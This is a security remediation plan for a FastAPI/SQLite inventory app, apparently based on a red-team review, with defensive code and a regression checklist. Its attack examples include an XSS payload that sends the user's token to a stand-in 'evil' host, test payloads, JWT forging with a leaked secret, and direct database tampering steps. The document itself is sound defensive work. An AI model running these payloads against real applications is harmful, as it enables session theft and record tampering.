# VaultStock — Security Patch Plan

> Source: red-team review of the SQLite/FastAPI build (`api/`, `db/schema.sql`, `web/`, `run_dev.py`).
> Status: **NOT YET APPLIED.** Work through the phases in order. Each item lists the affected files, what to change, and how to check that the fix works.

---

## 0. Before you start

### 0.1 Decisions (already made, change them here if needed)

| Decision | Choice |
|---|---|
| Demo features (Simulate Tampering, Reset Demo) | Keep them, but only when `VAULTSTOCK_DEMO_MODE=1` **and** for admin users |
| "Switch User" button | Replace with a real login screen. In demo mode, show the demo usernames as a hint, never the passwords in JS |
| Who can read the audit trail / verify | Any authenticated user can read; only admin can reset or tamper |
| Who can create products | Admin only |
| Who can record movements | Admin and staff |
| Password hashing | `hashlib.pbkdf2_hmac` (stdlib, no new dependency), 600k iterations, 16-byte salt |
| Audit chain | HMAC-SHA256 over canonical JSON, keyed by `VAULTSTOCK_AUDIT_KEY` |

### 0.2 Breaking changes

The schema changes (new CHECK constraints, new columns, new triggers) **can't be applied to the existing `vaultstock.db`**, because `CREATE TABLE IF NOT EXISTS` will not alter it. Delete the old DB after Phase 2. Old SHA-256 password hashes and the old audit chain will be invalid, which is expected.

### 0.3 New environment variables

| Variable | Purpose | Default if unset |
|---|---|---|
| `VAULTSTOCK_JWT_SECRET` | JWT signing key (≥32 random bytes) | random per process (all sessions are lost on restart, which is acceptable) |
| `VAULTSTOCK_AUDIT_KEY` | HMAC key for the audit chain | **must be persistent.** If unset in dev, generate it once into `data/.audit_key` (see 2.4) |
| `VAULTSTOCK_DEMO_MODE` | `1` enables reset/tamper routes and `/docs` | off |
| `VAULTSTOCK_DB_PATH` | SQLite file location | `data/vaultstock.db` |
| `VAULTSTOCK_ADMIN_PASSWORD` / `VAULTSTOCK_STAFF_PASSWORD` | Seed passwords | random, printed to the console once at first seed |
| `VAULTSTOCK_ALLOWED_ORIGINS` | CORS allow-list | `http://localhost:3000,http://127.0.0.1:3000` |

Generate secrets with: `python -c "import secrets; print(secrets.token_hex(32))"`

### 0.4 Suggested new file: `api/config.py`

```python
import os, secrets
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
DATA_DIR = ROOT / "data"
DATA_DIR.mkdir(exist_ok=True)

DEMO_MODE = os.environ.get("VAULTSTOCK_DEMO_MODE") == "1"
DB_PATH = os.environ.get("VAULTSTOCK_DB_PATH", str(DATA_DIR / "vaultstock.db"))
JWT_SECRET = os.environ.get("VAULTSTOCK_JWT_SECRET") or secrets.token_hex(32)
JWT_TTL_SECONDS = int(os.environ.get("VAULTSTOCK_JWT_TTL", "3600"))
ALLOWED_ORIGINS = [o.strip() for o in os.environ.get(
    "VAULTSTOCK_ALLOWED_ORIGINS",
    "http://localhost:3000,http://127.0.0.1:3000").split(",") if o.strip()]

def _load_audit_key() -> bytes:
    env = os.environ.get("VAULTSTOCK_AUDIT_KEY")
    if env:
        return bytes.fromhex(env) if all(c in "0123456789abcdef" for c in env.lower()) else env.encode()
    key_file = DATA_DIR / ".audit_key"          # dev fallback only
    if not key_file.exists():
        key_file.write_text(secrets.token_hex(32))
    return bytes.fromhex(key_file.read_text().strip())

AUDIT_HMAC_KEY = _load_audit_key()
```

> [!NOTE]
> Keeping `.audit_key` next to the DB means an attacker who can read the folder can still forge the chain. That's acceptable for dev. In production, pass the key through an env var or a secrets manager on a different trust boundary, and document this.

---

## Vulnerability index

| ID | Sev | Title | Phase |
|---|---|---|---|
| V-01 | 🔴 | Stored XSS in every `innerHTML` render + `onclick` attribute breakout | 1 |
| V-02 | 🔴 | Unauthenticated read and destructive endpoints (reset, tamper, all GETs) | 1 |
| V-03 | 🔴 | No RBAC: role in JWT is never checked | 1 |
| V-04 | 🔴 | Hardcoded JWT secret, no `exp` | 1 |
| V-05 | 🔴 | Unsalted single-round SHA-256 passwords | 1 |
| V-06 | 🔴 | Frontend auto-logs in as admin with hardcoded credentials | 1 / 3 |
| V-07 | 🟠 | Unbounded inputs → `SUM()` integer-overflow DoS, huge strings, `inf`/`nan` price | 1 |
| V-08 | 🟡 | Raw exception text leaked to the client | 1 |
| V-09 | 🟡 | CORS `*` with credentials (plus CSRF via simple `no-cors` POST) | 1 |
| V-10 | 🟠 | TOCTOU race: oversell + audit-chain fork / ID collision | 2 |
| V-11 | 🟠 | No DB-level negative-stock guard | 2 |
| V-12 | 🟠 | `audit_log` and `products` not protected by triggers | 2 |
| V-13 | 🟠 | Unkeyed hash chain: a file-level attacker can recompute all hashes | 2 |
| V-14 | 🔴 | Audit chain doesn't commit to movements; a direct INSERT is undetected | 2 |
| V-15 | 🟠 | Verify misses deleted blocks, ID gaps, and tail truncation | 2 |
| V-16 | 🟠 | Role/user not re-validated per request (revocation impossible) | 1 |
| V-17 | 🟠 | No login rate limiting / lockout | 3 |
| V-18 | 🟡 | Public Swagger `/docs` + `/openapi.json` | 3 |
| V-19 | 🟡 | No security headers (CSP, clickjacking, nosniff); static server sends `ACAO: *` | 3 |
| V-20 | 🟡 | Live DB in project root, shipped with the code | 3 |
| V-21 | 🟡 | No pinned dependencies; `reload=True` always on | 3 |
| V-22 | 🟢 | Legacy Postgres files contain default credentials | 3 |
| V-23 | 🟢 | `THREAT_MODEL.md` claims controls that don't exist in this build | 3 |

---

## Phase 1 — Authentication, authorization, input and output safety

### P1.1 Fix stored XSS (V-01) — `web/app.js`

**Attack:** `POST /api/products` with name `<img src=x onerror=fetch('//evil/'+currentUser.token)>`. It runs for every viewer. A name containing `"` also breaks out of the `onclick="openMovementModal(..., '...')"` attribute.

**Fix:**
1. Add a helper and use it on **every** interpolated server value (`sku`, `name`, `note`, `created_by`, `created_at`, `action`, `details`, `timestamp`, `row_hash`, `prev_hash`, `product_name`):
   ```js
   function esc(v) {
     return String(v ?? "").replace(/[&<>"'`]/g, c => ({
       "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;", "`": "&#96;"
     })[c]);
   }
   ```
2. Remove the inline `onclick`. Use data attributes plus event delegation:
   ```js
   // in the template
   `<button class="btn-secondary js-move" data-id="${Number(p.id)}" data-name="${esc(p.name)}">Stock In / Out</button>`
   // once, at startup
   productTableBody.addEventListener("click", e => {
     const b = e.target.closest(".js-move");
     if (b) openMovementModal(Number(b.dataset.id), b.dataset.name);
   });
   ```
   Then drop `window.openMovementModal =` and make it a plain function.
3. Coerce numbers before rendering: `Number(p.unit_price).toFixed(2)`, `Number(p.current_stock)`, `Number(m.qty)`, `Number(a.id)`.
4. Keep using `innerText`/`textContent` where it's already used (modal title, alerts). Those are safe.
5. Optional, more robust: build rows with `document.createElement` + `textContent` instead of template strings.

**Verify:** create products named `<img src=x onerror=alert(1)>` and `a" onmouseover="alert(1)`. Both should render as literal text in the table, movements feed and audit feed. No alert should fire.

---

### P1.2 Password hashing (V-05) — `api/security.py` (new), `api/db.py`, `api/main.py`

```python
# api/security.py
import hashlib, hmac, os

_ITER = 600_000
_DUMMY = None

def hash_password(pw: str) -> str:
    salt = os.urandom(16)
    dk = hashlib.pbkdf2_hmac("sha256", pw.encode(), salt, _ITER)
    return f"pbkdf2_sha256${_ITER}${salt.hex()}${dk.hex()}"

def verify_password(pw: str, stored: str) -> bool:
    try:
        algo, it, salt_hex, dk_hex = stored.split("$")
        if algo != "pbkdf2_sha256":
            return False
        dk = hashlib.pbkdf2_hmac("sha256", pw.encode(), bytes.fromhex(salt_hex), int(it))
        return hmac.compare_digest(dk.hex(), dk_hex)
    except Exception:
        return False

def dummy_verify(pw: str) -> None:
    """Burn equal time for unknown usernames (prevents user enumeration by timing)."""
    global _DUMMY
    _DUMMY = _DUMMY or hash_password("dummy-password")
    verify_password(pw, _DUMMY)
```

- In `init_db()` seeding, replace `quick_pw` with `hash_password`. Take passwords from `VAULTSTOCK_ADMIN_PASSWORD` / `VAULTSTOCK_STAFF_PASSWORD`. If unset, generate them with `secrets.token_urlsafe(12)` and **print them once** to the console.
- In `login()`, fetch the user **by username only**, then call `verify_password`. If no row exists, call `dummy_verify` and return the same 401 message.

**Verify:** `SELECT password_hash FROM users` shows `pbkdf2_sha256$600000$...`. Two users with the same password have different hashes.

---

### P1.3 JWT hardening + per-request user reload (V-04, V-16) — `api/main.py`

```python
import time, jwt
from api.config import JWT_SECRET, JWT_TTL_SECONDS

def issue_token(user) -> str:
    now = int(time.time())
    return jwt.encode({"sub": str(user["id"]), "iat": now, "nbf": now,
                       "exp": now + JWT_TTL_SECONDS, "iss": "vaultstock"},
                      JWT_SECRET, algorithm="HS256")

def get_current_user(authorization: Optional[str] = Header(None)) -> dict:
    if not authorization or not authorization.startswith("Bearer "):
        raise HTTPException(401, "Not authenticated")
    token = authorization[7:].strip()
    try:
        payload = jwt.decode(token, JWT_SECRET, algorithms=["HS256"], issuer="vaultstock",
                             options={"require": ["exp", "iat", "sub", "iss"]})
    except jwt.PyJWTError:
        raise HTTPException(401, "Session expired or token invalid")
    conn = get_connection()
    try:
        row = conn.execute("SELECT id, username, role FROM users WHERE id = ?",
                           (int(payload["sub"]),)).fetchone()
    finally:
        conn.close()
    if not row:
        raise HTTPException(401, "User no longer exists")
    return dict(row)          # role comes from the DB, NOT from the token
```

- Remove `role`/`username` claims from the token. They are fetched fresh from the DB on each request.
- Delete the hardcoded `JWT_SECRET = "vaultstock-minimalist-secret-key-2026"`.

**Verify:** a token signed with the old hardcoded secret gets 401. A token with `exp` in the past gets 401. Deleting a user invalidates their live token immediately.

---

### P1.4 Authentication + RBAC on every route (V-02, V-03) — `api/main.py`

```python
def require_role(*roles):
    def dep(user: dict = Depends(get_current_user)) -> dict:
        if user["role"] not in roles:
            raise HTTPException(403, "Insufficient privileges")
        return user
    return dep

require_admin = require_role("admin")
require_any = require_role("admin", "staff")
```

| Route | Dependency |
|---|---|
| `POST /api/login` | none (rate-limited, P3.1) |
| `GET /api/me` (new; returns `{username, role}` for the UI) | `require_any` |
| `GET /api/products` | `require_any` |
| `POST /api/products` | `require_admin` |
| `GET /api/movements` | `require_any` |
| `POST /api/movements` | `require_any` |
| `GET /api/audit` | `require_any` |
| `GET /api/audit/verify` | `require_any` |
| `POST /api/audit/tamper-demo` | `require_admin` **and** only registered if `DEMO_MODE` |
| `POST /api/reset-demo` | `require_admin` **and** only registered if `DEMO_MODE` |

Register the demo routes conditionally so they return 404 in non-demo mode:
```python
if DEMO_MODE:
    @app.post("/api/reset-demo")
    def reset_database(user: dict = Depends(require_admin)): ...
```
Write an audit entry for reset/tamper actions too (actor = admin username). After a reset, the first new block should record `DEMO_RESET by <admin>`.

**Verify:** each route without a token → 401. Staff → `POST /api/products` → 403. With demo mode off, `/api/reset-demo` → 404.

---

### P1.5 Input validation (V-07) — `api/main.py` (Pydantic v2)

```python
from pydantic import BaseModel, Field, ConfigDict

class _Strict(BaseModel):
    model_config = ConfigDict(str_strip_whitespace=True, extra="forbid")

class LoginRequest(_Strict):
    username: str = Field(min_length=1, max_length=32, pattern=r"^[A-Za-z0-9_.-]+$")
    password: str = Field(min_length=1, max_length=128)

class ProductCreate(_Strict):
    sku: str = Field(min_length=3, max_length=32, pattern=r"^[A-Z0-9][A-Z0-9_-]*$")
    name: str = Field(min_length=1, max_length=120)
    unit_price: float = Field(gt=0, le=10_000_000, allow_inf_nan=False)

class MovementCreate(_Strict):
    product_id: int = Field(gt=0, le=2_147_483_647)
    type: Literal["IN", "OUT"]
    qty: int = Field(gt=0, le=1_000_000)
    note: str = Field(default="Standard stock operation", max_length=200)
```

- Optionally reject control characters in `name`/`note` (`pattern=r"^[^\x00-\x1f\x7f]*$"`).
- Upper-case the SKU on the client or with a validator before matching the pattern.
- Mirror the limits in the DB (P2.2) so a direct insert can't bypass them either.

**Why `qty` matters:** with no upper bound, two `IN` movements of `5_000_000_000_000_000_000` make SQLite `SUM()` raise `integer overflow`. That breaks `GET /api/products` and every OUT balance check **permanently**, because movements can't be deleted.

**Verify:** `qty=10**19` → 422. `unit_price` sent as `Infinity` → 422. A 1 MB name → 422. Name `"   "` → 422. An unknown extra field → 422.

---

### P1.6 Error handling (V-08) — `api/main.py`

- Never return `str(e)` to the client. Log it server-side with `logging.exception(...)`.
- Map known cases:
  - `sqlite3.IntegrityError` containing `UNIQUE` on `products.sku` → `409 "SKU already exists"`
  - Trigger `RAISE(ABORT, 'SECURITY VIOLATION: ...')` → `409` with a fixed, safe message
  - Anything else → `500 "Internal error"`
- Fix the latent bug in `create_product`: `product_id` can be unbound if the exception path runs before `return`. Move the `return` inside `try` or initialize the variable.

---

### P1.7 CORS (V-09) — `api/main.py`

```python
app.add_middleware(CORSMiddleware,
    allow_origins=ALLOWED_ORIGINS,
    allow_credentials=False,          # we use Bearer headers, not cookies
    allow_methods=["GET", "POST"],
    allow_headers=["Authorization", "Content-Type"])
```

> [!IMPORTANT]
> CORS does **not** stop CSRF on its own. `fetch(url, {method: "POST", mode: "no-cors"})` from any site still reaches the server. The real fix for reset/tamper is P1.4 (Bearer auth). Keep tokens out of cookies so the browser never attaches them automatically.

---

### P1.8 Remove hardcoded credentials from the frontend (V-06, part 1) — `web/app.js`

- Delete `loginUser("admin", "admin123")` from `init()` and the hardcoded passwords in the `btnSwitchUser` handler.
- Interim step until P3.4: `prompt()` for username and password. Store the token **only in memory**, never in `localStorage`.
- Add an `apiFetch()` wrapper that attaches `Authorization`, and on `401` clears state and shows the login screen again. Use it for every call, including the GETs, which now require auth.

---

## Phase 2 — Make the integrity claims actually true

### P2.1 Serialize writes: no oversell, no chain fork (V-10) — `api/db.py`, `api/main.py`

**Attack:** fire 20 parallel `OUT qty=25` requests at a product with balance 25. Under default deferred transactions, several read `balance=25` before any of them writes, so stock goes negative. Concurrent `append_audit_entry` calls read the same `last_row.id` and collide on the primary key, or fork the chain.

**Fix:**
```python
def get_connection():
    conn = sqlite3.connect(DB_PATH, timeout=10, isolation_level=None)   # manual tx control
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA foreign_keys = ON;")
    conn.execute("PRAGMA journal_mode = WAL;")
    conn.execute("PRAGMA busy_timeout = 10000;")
    return conn

from contextlib import contextmanager
@contextmanager
def write_tx(conn):
    conn.execute("BEGIN IMMEDIATE;")          # takes the write lock BEFORE reading balance / chain head
    try:
        yield conn
        conn.execute("COMMIT;")
    except Exception:
        conn.execute("ROLLBACK;")
        raise
```
- In `record_movement` and `create_product`, wrap **the balance read, the insert, and `append_audit_entry`** in a single `with write_tx(conn):`.
- `init_db()` seeding should use `write_tx` too.
- Remove the scattered `conn.commit()` / `conn.rollback()` calls in these paths.

**Verify:** a scratch script (`threading`, 20 threads) issuing `OUT 25` against stock 25 → exactly one succeeds, 19 get 400/409, the final balance is 0, and `verify` passes.

---

### P2.2 Schema hardening (V-07, V-11, V-12) — `db/schema.sql`

```sql
CREATE TABLE IF NOT EXISTS products (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    sku TEXT NOT NULL UNIQUE CHECK(length(sku) BETWEEN 3 AND 32),
    name TEXT NOT NULL CHECK(length(trim(name)) BETWEEN 1 AND 120),
    unit_price REAL NOT NULL CHECK(unit_price > 0 AND unit_price <= 10000000),
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS movements (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    product_id INTEGER NOT NULL REFERENCES products(id),
    type TEXT NOT NULL CHECK(type IN ('IN','OUT')),
    qty INTEGER NOT NULL CHECK(typeof(qty) = 'integer' AND qty BETWEEN 1 AND 1000000),
    note TEXT CHECK(note IS NULL OR length(note) <= 200),
    created_by TEXT NOT NULL,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
);

-- Negative-stock guard at the DB layer (defense in depth for P2.1)
CREATE TRIGGER IF NOT EXISTS prevent_negative_stock
BEFORE INSERT ON movements
WHEN NEW.type = 'OUT'
BEGIN
    SELECT RAISE(ABORT, 'SECURITY VIOLATION: Insufficient stock.')
    WHERE (SELECT COALESCE(SUM(CASE WHEN type='IN' THEN qty ELSE -qty END), 0)
           FROM movements WHERE product_id = NEW.product_id) < NEW.qty;
END;

-- Audit log is append-only
CREATE TRIGGER IF NOT EXISTS prevent_audit_update BEFORE UPDATE ON audit_log
BEGIN SELECT RAISE(ABORT, 'SECURITY VIOLATION: Audit log is immutable.'); END;
CREATE TRIGGER IF NOT EXISTS prevent_audit_delete BEFORE DELETE ON audit_log
BEGIN SELECT RAISE(ABORT, 'SECURITY VIOLATION: Audit log is immutable.'); END;

-- Product catalog: no silent price/name edits or deletions (no update endpoint exists)
CREATE TRIGGER IF NOT EXISTS prevent_product_update BEFORE UPDATE ON products
BEGIN SELECT RAISE(ABORT, 'SECURITY VIOLATION: Products are immutable; create a new SKU.'); END;
CREATE TRIGGER IF NOT EXISTS prevent_product_delete BEFORE DELETE ON products
BEGIN SELECT RAISE(ABORT, 'SECURITY VIOLATION: Products cannot be deleted.'); END;

-- Users: role changes must go through the app (optional, add if a user-admin feature is built)
```

> [!NOTE]
> SQLite has no privilege system. Anyone who can open the `.db` file can `DROP TRIGGER`. The triggers stop **application-level** mistakes and casual SQL. The HMAC chain (P2.3–P2.5) is what **detects** file-level attackers. Document this in the threat model (P3.7).

---

### P2.3 Keyed, canonical audit hashing (V-13) — `api/db.py`

```python
import hmac, json
from api.config import AUDIT_HMAC_KEY

def compute_hash(prev_hash, row_id, action, actor, ref_table, ref_id, payload_json, timestamp) -> str:
    msg = json.dumps([prev_hash, row_id, action, actor, ref_table, ref_id, payload_json, timestamp],
                     separators=(",", ":"), ensure_ascii=False)
    return hmac.new(AUDIT_HMAC_KEY, msg.encode("utf-8"), hashlib.sha256).hexdigest()
```
- Canonical JSON removes delimiter ambiguity (the old `|` join).
- HMAC means someone with only the DB file **cannot recompute** valid hashes after editing a row.
- Use timezone-aware timestamps: `datetime.now(timezone.utc).isoformat(timespec="seconds")` (`utcnow()` is deprecated).

---

### P2.4 Bind audit blocks to the data they describe (V-14) — `db/schema.sql`, `api/db.py`, `api/main.py`

**Attack:** `INSERT INTO movements (product_id,type,qty,created_by) VALUES (1,'IN',1000,'ghost');` directly in SQLite. Stock appears from nowhere, and `verify` still says "100% intact", because the chain never references movement rows.

**Schema change:**
```sql
CREATE TABLE IF NOT EXISTS audit_log (
    id INTEGER PRIMARY KEY,                    -- explicit, contiguous, assigned by app inside write_tx
    action TEXT NOT NULL,
    actor TEXT NOT NULL,
    ref_table TEXT,                            -- 'movements' | 'products' | NULL
    ref_id INTEGER,
    payload TEXT NOT NULL,                     -- canonical JSON snapshot of the referenced row
    details TEXT NOT NULL,                     -- human-readable text (display only, NOT trusted)
    timestamp TEXT NOT NULL,
    prev_hash TEXT NOT NULL,
    row_hash TEXT NOT NULL,
    UNIQUE(ref_table, ref_id)
);
```

**App change:** `append_audit_entry(conn, action, actor, ref_table, ref_id, payload: dict, details)`.
- For movements: `payload = {"id", "product_id", "type", "qty", "note", "created_by"}`, taken from the row **just inserted** (use `cur.lastrowid`, then re-select it).
- For products: `payload = {"id", "sku", "name", "unit_price"}`.
- Seeding must use the same path, so seed movements get proper `ref_id`s. The current seed writes a generic `STOCK_IN` text with no linkage.
- Hash over `payload` (canonical JSON string), **not** `details`. `details` is display-only and should be rebuilt from `payload` if it needs to be trusted.

---

### P2.5 Strong verification (V-15) — `api/db.py`

`verify_audit_chain()` must check all of the following and report the first failure:

1. **Contiguity:** IDs are exactly `1..N` with no gaps (catches deleted middle blocks).
2. **Linkage:** `row.prev_hash == previous.row_hash`, and genesis is `"0"*64`.
3. **Integrity:** the recomputed HMAC equals `row_hash`.
4. **Reconciliation (movements):** every row in `movements` has exactly one audit block with `ref_table='movements' AND ref_id=movements.id`, **and** the block's `payload` equals the current row's canonical JSON. No block may point to a movement that doesn't exist.
5. **Reconciliation (products):** same for `products`.
6. **Tail truncation / anchoring:** deleting the newest blocks *and* their movements still leaves a valid-looking prefix. Mitigate with an anchor:
   - After each write, store `{"id": N, "row_hash": ...}` in a checkpoint **outside the DB** (e.g. `data/audit_head.json`, or better, append it to a separate log or send it to an external service).
   - `verify` fails if the DB head `id`/`row_hash` is older than, or differs from, the anchor.
   - Add `GET /api/audit/head` (admin) so the head can be copied to an external record (an email or printout for the viva demo).

Return shape (keep it backward compatible for the UI): `{verified, broken_at_id, reason, total_blocks, checks: {contiguity, linkage, integrity, reconciliation, anchor}}`.

---

### P2.6 Rework the demo endpoints to work with the triggers — `api/db.py`, `api/main.py`, `web/app.js`

With the audit triggers in place, `tamper_for_demo` would now fail, which proves the trigger works. Offer two demo buttons (demo mode + admin only):

| Demo | What it does | What it proves |
|---|---|---|
| **Tamper (app-level)** | Attempts `UPDATE audit_log ...` normally | Trigger blocks it → show the `SECURITY VIOLATION` message |
| **Tamper (file-level attacker)** | In one transaction: `DROP TRIGGER prevent_audit_update` → `UPDATE` details/payload of block #1 → recompute **plain SHA-256** (attacker lacks the key) → recreate the trigger | `verify` still detects it, because of the HMAC + reconciliation checks |
| *(optional)* **Ghost movement** | Drop the guard trigger, `INSERT` a movement directly with no audit block, recreate the trigger | `verify` reconciliation catches unaudited stock |

`reset-demo` should: drop tables → `init_db()` → write a first block `DEMO_RESET by <admin>` → reset the anchor file.

---

## Phase 3 — Hardening and cleanup

### P3.1 Login rate limiting (V-17) — `api/main.py`

There's no extra dependency, so use an in-memory limiter (fine for a single process):
```python
from collections import defaultdict, deque
_FAILS: dict[str, deque] = defaultdict(deque)
MAX_FAILS, WINDOW = 5, 900   # 5 failures / 15 min per (ip, username)

def _throttled(key: str) -> bool:
    q, now = _FAILS[key], time.time()
    while q and now - q[0] > WINDOW: q.popleft()
    return len(q) >= MAX_FAILS
```
- In `login(req, request: Request)`: `key = f"{request.client.host}:{req.username.lower()}"`. If throttled, return `429` with `Retry-After`. On failure, append `time.time()`. On success, clear the entry.
- Optionally log failed logins as an audit action `LOGIN_FAILED` (watch the volume, and don't log the password).

### P3.2 Hide API docs (V-18) — `api/main.py`
```python
app = FastAPI(title="VaultStock", version="2.1.0",
              docs_url="/docs" if DEMO_MODE else None,
              redoc_url=None,
              openapi_url="/openapi.json" if DEMO_MODE else None)
```

### P3.3 Security headers (V-19) — `api/main.py` + `run_dev.py`

API middleware:
```python
@app.middleware("http")
async def security_headers(request, call_next):
    resp = await call_next(request)
    resp.headers.update({
        "X-Content-Type-Options": "nosniff",
        "X-Frame-Options": "DENY",
        "Referrer-Policy": "no-referrer",
        "Cache-Control": "no-store",
        "Content-Security-Policy": "default-src 'none'; frame-ancestors 'none'",
    })
    return resp
```

Static server (`CORSRequestHandler.end_headers`): **remove** `Access-Control-Allow-Origin: *` and add:
```
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' https://fonts.googleapis.com; font-src https://fonts.gstatic.com; connect-src http://localhost:8000 http://127.0.0.1:8000; img-src 'self' data:; object-src 'none'; base-uri 'none'; form-action 'self'; frame-ancestors 'none'
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Referrer-Policy: no-referrer
```
- Also override `list_directory` to return 404 (disables directory listing).

> [!WARNING]
> This CSP blocks inline `style="..."` attributes, which `app.js` templates use heavily (e.g. `style="color: ${typeColor}"`). Either move them to CSS classes (`.feed-in`, `.feed-out`, `.muted`, `.text-right`), which is preferred, or add `'unsafe-inline'` to `style-src` temporarily. Inline *scripts* must never be allowed. P1.1 already removes the `onclick`.

### P3.4 Real login UI (V-06, part 2) — `web/index.html`, `web/app.js`, `web/style.css`
- Add a login overlay (username, password, submit, error line). The app content stays hidden until authenticated.
- Replace "Switch User" with "Log out" (clears the in-memory token, then shows the overlay).
- Hide "+ New Product", "Simulate Tampering" and "Reset Demo" for staff, and hide the demo buttons when the server reports demo mode off (expose `demo_mode` in `GET /api/me`). **Server-side checks remain the real control.** Hiding buttons is only UX.
- Show the generic message "Invalid username or password" on failure. Show "Too many attempts, retry in N s" on 429.

### P3.5 Move the database out of the shipped tree (V-20)
- Default `DB_PATH` → `data/vaultstock.db` (P0.4). Delete the root `vaultstock.db`.
- Add a `.gitignore`:
  ```
  data/
  *.db
  *.db-wal
  *.db-shm
  .env
  __pycache__/
  ```
- Exclude `data/` when zipping the project for submission (or ship a clean DB intentionally).

### P3.6 Dependencies and launcher (V-21) — `requirements.txt` (new), `run_dev.py`
- Create `requirements.txt` with pinned versions (`pip freeze | findstr /i "fastapi uvicorn pyjwt pydantic starlette"`). Require `pydantic>=2` and `PyJWT>=2.8`.
- `run_dev.py`: `reload=os.environ.get("VAULTSTOCK_RELOAD") == "1"`. Keep binding to `127.0.0.1`. Set `VAULTSTOCK_DEMO_MODE=1` in `dev.bat`/`dev.ps1` only, so production launches have it off.
- Remove the duplicate `import sys`.
- `dev.bat`/`dev.ps1` hardcode a user-specific Python path. That's harmless, but replace it with `py -3` / `python` for portability.

### P3.7 Legacy + documentation (V-22, V-23)
- `db/legacy/`: either delete it, or add `db/legacy/README.md` saying "Unused PostgreSQL reference design. Not executed by the app." Replace the literal passwords in `03_roles.sql` and `.env.example` with placeholders (`CHANGE_ME`).
- Update `.env.example` to the new variables from §0.3.
- Rewrite `docs/THREAT_MODEL.md` to describe **what is actually implemented**: PBKDF2 (not bcrypt), `BEGIN IMMEDIATE` (not `pg_advisory_xact_lock`), app-level RBAC (no `SET LOCAL ROLE`), HMAC chain + reconciliation + external anchor. Add a "File-level attacker" row and its limitations.
- Update `docs/TEST_CASES.md` with the security tests in §4.

---

## 4. Security regression checklist

Run these **before** patching (they should all succeed as attacks) and **after** (they should all be blocked). Save them as scripts under `tests/security/` if you like.

| # | Test | Expected after patch |
|---|---|---|
| T1 | `POST /api/reset-demo` with no token | 404 (demo off) / 401 (demo on) |
| T2 | `GET /api/products` with no token | 401 |
| T3 | Staff token → `POST /api/products` | 403 |
| T4 | JWT forged with `vaultstock-minimalist-secret-key-2026` | 401 |
| T5 | JWT with `exp` in the past | 401 |
| T6 | Product name `<img src=x onerror=alert(1)>` | Rendered as text, no alert |
| T7 | Product name `x" onmouseover="alert(1)` | Rendered as text, no alert |
| T8 | `qty = 10000000000000000000` | 422 |
| T9 | `unit_price = Infinity` (raw JSON) | 422 |
| T10 | 20 parallel `OUT 25` on stock 25 | Exactly 1 succeeds, balance = 0, verify ✅ |
| T11 | Direct SQLite `UPDATE audit_log SET details='x' WHERE id=1` | Trigger aborts |
| T12 | Drop trigger, edit block #1, recompute with plain SHA-256 | verify ❌ (integrity) |
| T13 | Direct SQLite `INSERT INTO movements ...` (no audit block) | verify ❌ (reconciliation) |
| T14 | Drop trigger, `DELETE FROM audit_log WHERE id = 3` | verify ❌ (contiguity) |
| T15 | Delete the last block + its movement | verify ❌ (anchor) |
| T16 | 6 wrong passwords for `admin` within 15 min | 6th → 429 |
| T17 | Login with unknown username vs wrong password | Same message, similar timing |
| T18 | `GET /docs` with demo mode off | 404 |
| T19 | Load the frontend inside an `<iframe>` on another origin | Blocked (`frame-ancestors`/XFO) |
| T20 | Error from duplicate SKU | `409 "SKU already exists"`, no SQLite text |
| T21 | `grep -ri "admin123\|staff123\|minimalist-secret" web api` | No matches |
| T22 | Old movements can't be updated/deleted (existing triggers) | Still aborts (no regression) |

---

## 5. File touch map

| File | Phases / items |
|---|---|
| `api/config.py` *(new)* | 0.4 |
| `api/security.py` *(new)* | P1.2 |
| `api/main.py` | P1.2–P1.7, P2.1, P2.4, P2.6, P3.1–P3.3 |
| `api/db.py` | P1.2 (seeding), P2.1, P2.3–P2.6 |
| `db/schema.sql` | P2.2, P2.4 |
| `web/app.js` | P1.1, P1.8, P2.6, P3.3 (inline styles), P3.4 |
| `web/index.html` | P3.4 |
| `web/style.css` | P3.3 (classes replacing inline styles), P3.4 |
| `run_dev.py` | P3.3, P3.6 |
| `dev.bat`, `dev.ps1` | P3.6 |
| `requirements.txt` *(new)*, `.gitignore` *(new)* | P3.5, P3.6 |
| `.env.example` | P3.7 |
| `db/legacy/*` | P3.7 |
| `docs/THREAT_MODEL.md`, `docs/TEST_CASES.md` | P3.7 |

## 6. Recommended order of execution

1. 0.4 config → P1.3/P1.4 (auth + RBAC) → P1.8 (frontend sends tokens) → **app works again with auth**
2. P1.1 XSS → P1.5 validation → P1.6 errors → P1.7 CORS → P1.2 passwords
3. Delete the DB → P2.2 schema → P2.1 transactions → P2.3/P2.4 chain → P2.5 verify → P2.6 demos
4. P3.x hardening → run the §4 checklist → update the docs

